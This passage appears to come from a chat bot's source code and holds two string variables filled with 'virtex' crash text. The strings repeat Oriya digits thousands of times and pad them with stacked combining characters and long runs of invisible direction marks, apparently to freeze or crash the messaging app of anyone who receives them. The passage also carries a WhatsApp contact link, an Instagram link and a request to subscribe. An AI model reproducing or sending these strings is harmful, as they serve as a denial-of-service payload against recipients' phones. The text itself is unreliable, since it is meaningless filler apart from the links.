*୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* *୧୧୧୧୧୧୧୧* ୪୪୪୪୪୪୪୪* *୨୨୨୨୨୨୨୨* wa.me//94767043432 *Bantu subs+view+like+share=pahala* *I⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟* *৭৭৭৭৭৭৭৭*'
				pirtex2 = '🧙‍♂️𝐀𝐥𝐚𝐤𝐚𝐳𝐚𝐦🔮  https://www.instagram.com/p/CE0pVKZs5Wk/?igshid=5ihhd4xdsgrhʙʏ:LᴏʀᴅSᴇᴛᴛ7‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎